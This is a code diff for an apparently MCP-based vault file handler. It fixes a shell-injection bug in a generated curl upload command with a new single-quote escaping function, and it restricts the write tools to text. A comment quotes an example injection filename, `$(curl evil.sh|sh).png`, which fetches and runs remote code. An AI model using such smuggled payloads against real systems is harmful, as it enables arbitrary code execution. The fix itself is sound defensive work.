@@ -181,6 +181,22 @@ function filenameOf(path: string): string {
   return path.includes("/") ? path.slice(path.lastIndexOf("/") + 1) : path;
 }
 
+/**
+ * Quote a string so a POSIX shell reads it as one literal word.
+ *
+ * This exists because `JSON.stringify` looked close enough and is not: it produces a
+ * *double*-quoted string, and a shell still expands `$`, backticks and `$(...)` inside
+ * double quotes. A vault file named `$(curl evil.sh|sh).png` therefore turned the
+ * ready-to-run command this handler advertises into arbitrary code execution the moment
+ * someone pasted it. Single quotes suppress every expansion; the only character that
+ * cannot appear inside them is `'` itself, which is closed, escaped, and reopened.
+ */
+export function shellQuote(value: string): string {
+  // Written as plain strings, not a template literal: inside a template literal `\'`
+  // collapses to a bare `'` and the backslash this depends on is silently lost.
+  return "'" + value.split("'").join("'\\''") + "'";
+}
+
 interface ResourceSpec {
   name: string;
   uri: string;
@@ -783,7 +799,7 @@ export class McpHandler {
             path: normalized,
             contentType: mimeType,
             expiresAt,
-            command: `curl -X PUT -H "Content-Type: ${mimeType}" --data-binary @${JSON.stringify(filenameOf(normalized))} "${url}"`,
+            command: `curl -X PUT -H "Content-Type: ${mimeType}" --data-binary @${shellQuote(filenameOf(normalized))} "${url}"`,
           });
         },
       ),
@@ -884,7 +900,7 @@ export class McpHandler {
 
     this.tool(
       "vault_write",
-      dedent`Create or overwrite a vault file with the given content. Creates any missing parent directories automatically. Overwrites without warning if the file already exists.`,
+      dedent`Create or overwrite a vault file with the given content. Text only: a path whose extension names an image, audio, video, font, PDF or archive type is refused, as is content containing a NUL byte, because writing text there would corrupt the file -- upload those bytes with vault_get_upload_url, or PUT /vault/<path> over the REST API. Creates any missing parent directories automatically. Overwrites without warning if the file already exists.`,
       {
         path: z.string().describe("File path relative to vault root"),
         content: z.string().describe("Full file content (markdown text)"),
@@ -921,8 +937,19 @@ export class McpHandler {
           }
           return this.downloadLinkResult(normalized);
         }
-        const bytes = await this.ops.readBinaryFileContent(normalized);
         const mimeType = mime.lookup(normalized) || "application/octet-stream";
+        // Decide before reading. Only an image or an SVG needs the bytes in hand -- one
+        // to be decoded and measured, the other to be returned as its own source -- and
+        // everything else, with signed URLs on, ends as a link. Reading first meant a
+        // multi-gigabyte video was loaded into the renderer in full and then discarded,
+        // which is both pointless and the sort of allocation that kills the renderer
+        // outright (see MaximumMcpBinaryBytes). `downloadLinkResult` still throws for a
+        // file that does not exist, so the tool's contract is unchanged.
+        const mayNeedBytes = mimeType === SVG_MIME_TYPE || mimeType.startsWith("image/");
+        if (mode === "auto" && this.signedUrlsEnabled && !mayNeedBytes) {
+          return this.downloadLinkResult(normalized);
+        }
+        const bytes = await this.ops.readBinaryFileContent(normalized);
         if (mode === "auto" && mimeType === SVG_MIME_TYPE) {
           const svg = this.svgTextResult(normalized, bytes);
           if (svg) return svg;
@@ -939,7 +966,7 @@ export class McpHandler {
 
     this.tool(
       "vault_append",
-      dedent`Append content to the end of a vault file. Creates the file if it does not already exist.`,
+      dedent`Append content to the end of a vault file. Creates the file if it does not already exist. Text only, on the same terms as vault_write: a path whose extension names a binary type is refused, as is content containing a NUL byte.`,
       {
         path: z.string().describe("File path relative to vault root"),
         content: z.string().describe("Content to append"),
